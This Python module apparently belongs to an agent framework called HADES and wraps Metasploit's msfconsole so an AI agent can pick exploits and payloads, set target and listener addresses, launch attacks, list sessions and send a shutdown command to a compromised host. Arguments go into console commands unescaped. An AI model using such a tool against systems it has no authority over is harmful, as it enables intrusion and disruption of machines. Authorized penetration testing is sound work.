"""Defines Msfconsole as a HADES agent tool."""

# Standard library imports.
from logging import Logger
from subprocess import PIPE, Popen, STDOUT
from typing import Annotated, List

# Local imports.
from .msfconsole_args import MsfconsoleArgs
from .payloads import get_payloads
from hades.core import get_logger
from hades.core.utils import get_timestamp

def msfconsole(args: Annotated[MsfconsoleArgs, "Metasploit arguments."]) -> str:
    """Metasploit is a tool used for exploiting cyber security vulnerabilities.
    
    Returns:
        str.

    """
    # Init a logger for the tool itself.
    logger = get_logger(name="msfconsole", format="json")

    # Init an array to store the commands the tool will execute.
    commands = []

    def msfcli(commands: List[str]) -> str:
        # Assemble the command sentence.
        cli = ["msfconsole", "-q", "-x"]
        cli.append(" ".join(commands))

        # Log the command sentence.
        logger.info(f"executing '{' '.join(commands)}'")

        # Execute the command sentence (an array of strings).
        process = Popen(cli, stderr=STDOUT, stdout=PIPE, text=True)

        # Save the stdout and stderr of the command to a variable. 
        stdout, stderr = process.communicate()

        # Log any errors the command produced.
        if stderr is not None:
            logger.error(stderr)

        # TODO: limit character count to meet LLM input requirements.
        return stdout

    # Check if the "sessions" command was requested.
    if args.sessions is True:
        commands.append("sessions; exit;")
        output = msfcli(commands)
        if "No active sessions." in output:
            timestamp = get_timestamp()
            return f"As of {timestamp}, we have no sessions open on {args.rhosts}."
        return output

    # Check if the "show payloads" command was requested.
    if args.showPayloads is True:
        # Set the command.
        return get_payloads()

    # Check if shutdown was requested.
    if args.shutdown is True:
        commands.append("sessions -i 1 -c 'shutdown now'; exit -y;") 
        return msfcli(commands)

    # Check if a payload was specified.
    if args.payload is not None:

        # Check if showing the payload's options was requested.
        if args.showPayloadOptions is True:
            # Set the command.
            commands.append(f"use '{args.payload}'; show options; exit;")
            return msfcli(commands)
        
        commands.append(f"set PAYLOAD '{args.payload}';")

        # Check if specific exploit options were requested.
        if args.options is not None:
            for option, value in args.options.items():
                commands.append(f"set {option} '{value}';")

    # Define the exploit module to use.
    if args.exploit is not None:

        # Check if the "show payloads" command was requested.
        if args.showExploitOptions is True:
            # Set the command.
            commands.append(f"use '{args.exploit}'; show options; exit;")
            return msfcli(commands)
        
        commands.append(f"use '{args.exploit}';")

    # Set the target IP address.
    if args.rhosts is not None:
        commands.append(f"set RHOSTS '{args.rhosts}';")

    # Set the target port.
    if args.rport is not None:
        commands.append(f"set RPORT '{args.rport}';")

    # Set the IP address to listen on.
    if args.lhost is not None:
        commands.append(f"set LHOST '{args.lhost}';")

    # Set the port to listen on.
    if args.lport is not None:
        commands.append(f"set LPORT '{args.lport}';")

    # Add the "exploit" command.
    # NOTE: the keyword 'exploit' will not be recognized by Metasploit if an invalid exploit and/or payload is given. 
    commands.append("run -z; exit -y;") 
    return msfcli(commands)
